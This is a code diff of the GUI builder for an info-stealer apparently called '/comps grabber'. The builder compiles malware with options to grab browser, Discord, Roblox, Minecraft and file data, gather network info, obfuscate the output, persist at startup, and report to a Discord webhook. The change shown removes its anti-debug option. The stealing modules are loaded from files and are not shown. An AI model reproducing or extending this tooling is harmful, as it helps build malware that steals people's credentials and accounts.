@@ -35,7 +35,7 @@ compilebu = PhotoImage(file='assets/compile.png')
 
 class Builder:
     
-    def __init__(self,browserR,discordR,robloxR,filesR,minecraftR,networkI,obfuscateS,webhookJ,antiD,rebootP,startupP,errorM,pingH,discordS,wbh,name,icon):
+    def __init__(self,browserR,discordR,robloxR,filesR,minecraftR,networkI,obfuscateS,webhookJ,rebootP,startupP,errorM,pingH,discordS,wbh,name,icon):
         webhook = DiscordWebhook(url=wbh, username="/comps", avatar_url=r"https://cdn.discordapp.com/avatars/1080175185992372305/a_f58708f3dfc937b11c38d7863e925bb9.gif")
         embed = DiscordEmbed(title=f"Grabber Compiled", description=f"Options Chose", color='4300d1')
         embed.set_author(name="author : escrow", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
@@ -88,12 +88,6 @@ class Builder:
         else:
             embed.add_embed_field(name=f"Network Info : ", value=f":x:")
             self.FILE.write("class Network:\n\tpass\n")
-        if antiD:
-            embed.add_embed_field(name=f"Anti Debug : ", value=f":white_check_mark:")
-            self.FILE.write(open("utils/AntiDebug.py",'r').read()+"\n")
-        else:
-            embed.add_embed_field(name=f"Anti Debug : ", value=f":x:")
-            self.FILE.write("class Antidebug:\n\tpass\n")
         if rebootP:
             embed.add_embed_field(name=f"Reboot : ", value=f":white_check_mark:")
             self.FILE.write(open("utils/Reboot.py",'r').read()+"\n")
@@ -127,7 +121,6 @@ class Builder:
         self.FILE.write(Maincode+"\n")
         self.FILE.write("""
 def main():
-    Thread(target=Antidebug).start()
     Startup()
     Thread(target=ErrorMsg).start()
     Screeny()
@@ -216,7 +209,6 @@ class Menu:
         self.networkI = False
         self.obfuscateS = False
         self.webhookJ = False
-        self.antiD = False
         self.rebootP = False
         self.startupP = False
         self.errorM = False
@@ -310,13 +302,6 @@ class Menu:
             self.WebhookJ.config(image=fullbu)
             self.webhookJ = True
     
-    def _adsetup(self):
-        if self.antiD:
-            self.AntiD.config(image=blankbu)
-            self.antiD = False
-        else:
-            self.AntiD.config(image=fullbu)
-            self.antiD = True
     
     def _rpsetup(self):
         if self.rebootP:
@@ -393,12 +378,6 @@ class Menu:
         else:
             self.WebhookJ = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._wjsetup)
             self.WebhookJ.place(x=228,y=324)
-        if self.antiD == False:
-            self.AntiD = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._adsetup)
-            self.AntiD.place(x=228,y=363)
-        else:
-            self.AntiD = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._adsetup)
-            self.AntiD.place(x=228,y=363)
         if self.rebootP == False:
             self.RebootP = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rpsetup)
             self.RebootP.place(x=494,y=284)
@@ -466,7 +445,7 @@ class Menu:
                     if icon == "Icon Path" or icon == "":
                         icon = ""
                     # :skull: ik
-                    Builder(self.browserR,self.discordR,self.robloxR,self.filesR,self.minecraftR,self.networkI,self.obfuscateS,self.webhookJ,self.antiD,self.rebootP,self.startupP,self.errorM,self.pingH,self.discordS,webhook,name,icon)
+                    Builder(self.browserR,self.discordR,self.robloxR,self.filesR,self.minecraftR,self.networkI,self.obfuscateS,self.webhookJ,self.rebootP,self.startupP,self.errorM,self.pingH,self.discordS,webhook,name,icon)
                 else:
                     messagebox.showerror("/comps grabber || @escrow#0001","Invalid Webhook")
             except:
